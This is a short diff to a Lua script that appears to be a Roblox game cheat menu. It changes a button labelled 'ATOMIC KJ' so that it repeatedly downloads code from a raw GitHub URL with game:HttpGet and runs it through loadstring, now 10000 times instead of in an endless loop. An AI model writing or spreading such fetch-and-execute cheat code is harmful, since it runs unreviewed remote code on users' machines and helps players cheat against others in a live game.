@@ -511,10 +511,9 @@ end
 })
 
 local Button = Tab:CreateButton({
- Name = "ATOMIC KJ",
+ Name = "ATOMIC KJ - use during hakari domain",
  Callback = function()
-        while true do
-  wait(0.001)
+        for i = 1, 10000 do
 loadstring(game:HttpGet("https://raw.githubusercontent.com/IFeelPower/Battle/refs/heads/main/KoJ"))()
 end
    end    
